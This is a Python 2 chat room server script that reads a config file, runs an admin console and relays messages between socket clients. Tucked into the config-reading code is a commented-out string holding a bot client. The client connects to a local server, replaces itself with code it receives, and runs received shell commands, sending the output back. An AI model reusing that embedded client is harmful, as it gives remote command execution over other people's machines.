#!/usr/bin/env python
# -.- coding: utf-8 -.-y
import threading
import Queue
import socket
import time
import sys
import os
from cmd import Cmd
#Created by Camerin Figueroa
cv = "1.0"
q = Queue.Queue()
q.put([])
errors = Queue.Queue()
errors.put([])
motd = Queue.Queue()
quit = Queue.Queue()
quit.put("")
mesg = Queue.Queue()
mesg.put("")
print """\33[91m
═════════════════════════════════════════════════════════
                ███████    ██████         ███████
               █           █     █       █ ║
              █            █════╗ █   ╔═█  ║
             █═════════════█    ╚█    ║█═══╝
             █             ██████     ║█
              █            █   █      ╚╗█  ╔═══════Server
               █════════╗  █    █      ╚═█ ║
                ███████ ║  █     █        ███████
Chat Room Client════════╝
═════════════════════════════════════════════════════════
\33[92m"""
port = 99999
configcont = "#Replace Everything behind = sign\n#Ex before: config = edit\n#Ex after: config = configinput\n\nmotd = Hello world This is a new Chat Room Server made by Camerin Figueroa\nport = 22550\n"
if os.path.isfile('./crsconfig.txt') == True:
    f = open('./crsconfig.txt', 'r')
    #configuration = 'import socket\nimport os\nimport time\nimport subprocess\nimport sys\ncv = "1.0"\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_address = (\'127.0.0.1\', 65021)\nsock.connect(server_address)\nrcv = sock.recv(128)\nsock.send(cv)\ncid = sock.recv(1024)\nif cid == "newver":\n    print "initiating update"\n    output = sock.recv(1024)\n    print output\n    if output == "tb:2":\n        print "tb2"\n        output1 = sock.recv(1024)\n        output2 = sock.recv(1024)\n        output = output1 + output2\n    elif output == "tb:3":\n        print "tb3"\n        output1 = sock.recv(1024)\n        output2 = sock.recv(1024)\n        output3 = sock.recv(1024)\n        output = output1 + output2 + output3\n    else:\n        print "tb1"\n        output = sock.recv(1024)\n    path = os.path.realpath(__file__)\n    f = open(path, \'w\')\n    f.write(output)\n    f.close()\n    os.system("python " + path + " &")\n    sys.exit()\nelse:\n    pass\nprint cid\nwhile True:\n    try:\n        sock.send("Ping")\n        data = sock.recv(1024)\n        cmd = data\n        print "Running " + cmd\n        if " " in data:\n            cmd.split(" ")\n            output = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True).communicate()[0]\n        else:\n            output = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True).communicate()[0]\n        sock.send(cid + ":" + output)\n    except:\n        pass\n    time.sleep(20)\nsock.close()\n'
    configuration = f.read()
    f.close()
    configuration = configuration.split("\n")
    for line in configuration:
        if "motd =" in line:
            motd.put(line[10:])
        else:
            pass
        if "port = " in line:
            port = int(line[7:])

        else:
            pass

else:
    f = open('./crsconfig.txt', 'w')
    f.write(configcont)
    f.close()
    print "Please edit crsconfig.txt"
    sys.exit()
if port != 99999:
    pass
else:
    f = open('./crsconfig.txt', 'w')
    f.write(configcont)
    f.close()
    print "Please edit crsconfig.txt"
    sys.exit()
def console(q, errors, motd):
    if __name__ == '__main__':
        prompt = consoleprompt()
        prompt.prompt = '> '
        prompt.cmdloop('Starting prompt...')
class consoleprompt(Cmd):
    def do_printdb(self, args):
        global q
        self.quit = quit
        db = q.get()
        q.put(db)
        for line in db:
            for lin in line:
                print lin
    def do_online(self, args):
        print "In Development..."
    def do_printerrors(self, args):
        global errors
        erlist = errors.get()
        errors.put(erlist)
        print erlist
    def do_motd(self, args):
        if "-c" in args:
            global motd
            oldmotd = motd.get()
            motd.put(args[3:])
            print "motd changed from " + oldmotd + " to " + args[3:]
        else:
            print "add -c newcmd"
    def do_quit(self, args):
        global quit
        print "Quitting."
        quit.get()
        quit.put("quitting:")
        time.sleep(2)
        os._exit(0)
class Server(object):
    def __init__(self, host, port, q, motd, errors, mesg, quit):
        self.motd = motd
        self.quit = quit
        self.errors = errors
        self.host = host
        self.port = port
        self.q = q
        self.mesg = mesg
        self.online = []
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
    def listen(self):
        self.sock.listen(5)
        while True:
            client, address = self.sock.accept()
            client.settimeout(60)
            #threading.Thread(target = self.sendcid,args = (client,address)).start()
            #global clientdb
            threading.Thread(target = self.listenToClient,args = (client,address)).start()
    def listenToClient(self, client, address):
        global cv
        cmd = self.motd.get()
        self.motd.put(cmd)
        #global clientdb
        rcv = client.recv(128)
        if str(cv) != rcv[3:] and "cv:" in rcv:
            client.send("comp:0:" + str(cv))
        elif rcv == "screen:":
            cmessage = self.mesg.get()
            self.mesg.put(cmessage)
            lm = cmessage
            try:
                while True:
                    time.sleep(.001)
                    cmessage = self.mesg.get()
                    self.mesg.put(cmessage)
                    if cmessage != lm:
                        client.send(cmessage)
                        lm = cmessage
                    else:
                        pass
                    quit = self.quit.get()
                    self.quit.put(quit)
                    if quit == "quitting:":
                        client.send("quitting:")
                    else:
                        pass
            except:
                pass
        else:
            client.send("comp:1")
            name = client.recv(1024)
            if "user:" not in name:
                client.send("error:wrong type of packet received. 'user:' was not within the packet")
                erlist = errors.get()
                erlist.append(client.gethostname() + ":wrong type of packet received. 'user:' was not within the packet")
                errors.put(erlist)
            else:
                name = name[5:]
                used = False
                for user in self.online:
                    if user == name:
                        used = True
                    else:
                        pass
                if used == True:
                    client.send("error:Username has already been used before.")
                    client.close()
                    erlist = errors.get()
                    erlist.append(client.gethostname() + ":" + name + ":Username has already been used before.")
                    errors.put(erlist)
                    check = False
                else:
                    client.send("user:" + name)
                    check = True
            if check == True:
                db = q.get()
                q.put(db)
                leng = 0
                for nam in db:
                    if name == nam[0]:
                        nl = leng
                    else:
                        leng = leng + 1
                if 'nl' in locals():
                    pass
                else:
                    nl = leng
                    db.append([name,])
                    q.get()
                    q.put(db)
                try:
                    self.online.append(name)
                    while True:
                            rmesg = client.recv(1024)
                            if "" == rmesg:
                                pass
                            elif "/help" == rmesg:
                                pass
                            else:
                                self.mesg.get()
                                self.mesg.put(name + ":" + rmesg[5:])
                except:
                    if name in self.online:
                        self.online.remove(name)
                    else:
                        pass
            else:
                pass
def writeoutput(q, errors):
    while True:
        try:
            time.sleep(10)
            tta = q.get()
            q.put(tta)
            error = errors.get()
            errors.put(error)
            fw = "Users:\n"
            for line in tta:
                for lin in line:
                    fw = fw + str(lin) + "\n"
            fw = fw + "═════════════════════════════════════════════════════════\nErrors:\n" + error
            f = open("crs.log", 'w')
            f.write(fw)
            f.close()
        except:
            error = errors.get()
            error = error + "exception\n"
            errors.put(error)
if __name__ == "__main__":
    threading.Thread(target = writeoutput,args = (q,errors)).start()
    threading.Thread(target = console,args = (q, errors, motd)).start()
    Server('',port,q,motd,errors,mesg, quit).listen()
